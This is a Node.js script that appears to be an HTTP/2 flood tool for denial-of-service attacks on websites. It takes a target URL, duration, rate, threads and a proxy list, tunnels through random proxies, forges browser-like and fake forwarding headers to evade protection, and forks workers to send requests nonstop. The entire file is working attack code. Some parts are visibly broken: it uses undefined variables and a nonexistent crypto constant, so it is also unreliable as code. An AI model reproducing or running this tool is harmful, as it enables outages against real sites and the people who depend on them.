const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const randstr = require('randomstring');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;


process.setMaxListeners(0);
process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const target = process.argv[2];
const time = process.argv[3];
const ratelimit = process.argv[4];
const threads = process.argv[5];
const proxyfile = process.argv[6];
const useRandomSuffix = process.argv[7] === 'rand';

function ra() {
    const rsdat = randstr.generate({
        "charset": "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
        "length": 10
    });
    return rsdat;
}

const mqfi9qjkf3i = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
let custom_table = 65535;
let custom_window = 6291455;
let custom_header = 262144;
let custom_update = 15663105;
let headersPerReset = 0;
let SO_SNDBUF = 7;
let SO_RCVBUF = 8;
let TCP_NODELAY = 1;
let SOL_SOCKET = 1;
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

const statusCodes = {};
let shouldPrint = false;

function printStatusCodes() {
    if (shouldPrint) {
        console.log(statusCodes);
        shouldPrint = false;
        for (const code in statusCodes) {
            statusCodes[code] = 0;
        }
    }
}

setInterval(printStatusCodes, 1000);

function go() {
    var [proxyHost, proxyPort] = "";

    [proxyHost, proxyPort] = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)].split(':');

    let SocketTLS;

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            

            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                rejectUnauthorized: false
            }, () => {
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.5 ? [[1, custom_header]] : []),
                        [2, 0],
                        ...(Math.random() < 0.5 ? [[4, custom_window]] : []),
                        ...(Math.random() < 0.5 ? [[6, custom_table]] : []),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                SocketTLS.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
  
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
    if (frame.type == 4 && frame.flags == 0) {
                                        
                                        tlsSocket.write(encodeFrame(0, 4, "", 1))
                                   }

            if (frame.type == 0) {
  
                                        let window_size = frame.length;
                                        if (window_size < 6000) {
                                             let inc_win = 65536 - window_size;
                                             window_size += inc_win;
 
                                             const update_win = Buffer.alloc(4);
                                             update_win.writeUInt32BE(inc_win, 0);
                                             tlsSocket.write(encodeFrame(0, 8, update_win));
                                        }
                                   }
                            if (frame.type === 1) {
                                const headers = hpack.decode(frame.payload);
                                const statusCodeHeader = headers.find(header => header[0] === ':status');
                                if (statusCodeHeader) {
                                    const statusCode = statusCodeHeader[1];
                                    statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
                                    shouldPrint = true;
                                }
                            }
                            
                            if (frame.type == 6) {
                                        if (!(frame.flags & 0x1)) {
                                             tlsSocket.write(encodeFrame(0, 6, frame.payload, 0x1));
                                        }
                                   }
                                   if (frame.type == 7 || frame.type == 5) {
                                        if (frame.type == 7) {
                                             if (!statuses["GOAWAY"])
                                                  statuses["GOAWAY"] = 0

                                             statuses["GOAWAY"]++
                                        }
                                        tlsSocket.end(() => tlsSocket.destroy())
                                        return
                                   }

                              } else {
                                   break
                              }
                         }
                    })

                SocketTLS.write(Buffer.concat(frames));

                function main() {
                    if (SocketTLS.destroyed) {
                        return;
                    }

                    let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                    let version = Math.floor(Math.random() * 34) + 100;

                    const headers = Object.entries({
                        ":method": "GET",
                        ":authority": url.hostname,
                        ":scheme": "https",
                        ":path": url.pathname.replace("[rand]", useRandomSuffix ? ra() : ""),
                    }).concat(Object.entries({
                        "sec-ch-ua": `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${version}\"`,
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "upgrade-insecure-requests": "1",
                        "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
                        ...(Math.random() < 0.5 && { "cookie": `${generateNumbers}` }),
                        ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${generateNumbers}` }),
                    }).filter(a => a[1] != null));

                    const fakeAkamaiHeaders = {
                        "X-Forwarded-For": `${randstr.generate({ length: 8, charset: '1234567890' })}`,
                        "X-Forwarded-Proto": "https",
                        "X-Real-IP": `${randstr.generate({ length: 8, charset: '1234567890' })}`,
                        "X-Akamai-Request": `${randstr.generate({ length: 8, charset: '1234567890' })}`,
                    };

                    const ja3Fingerprint = "771,49195-49199-49198-49200-49193-49196-49197-49194-49192";
                    const headers2 = Object.entries({
                        "sec-fetch-site": "none",
                        ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                        ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                        ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                    }).filter(a => a[1] != null);

                    const headers3 = Object.entries({
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
                        ...(Math.random() < 0.5 && { "cookie": `${generateNumbers}` }),
                        ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${generateNumbers}` }),
                    }).filter(a => a[1] != null);

                    for (let i = headers3.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
                    }

                    const combinedHeaders = headers.concat(headers2).concat(headers3);

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(combinedHeaders)
                    ]);

                    SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));

                    streamId += 2;
                 if (streamId > 200) return;
                              
                    setTimeout(() => {
                        main();
                    }, 1000 / ratelimit);
                }

                main();
            }).on('error', () => {
                SocketTLS.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (SocketTLS) {
            SocketTLS.end(() => {
                SocketTLS.destroy();
                go();
            });
        }
    });
}



if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    
    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(go);
    setTimeout(() => process.exit(1), time * 1000);
}
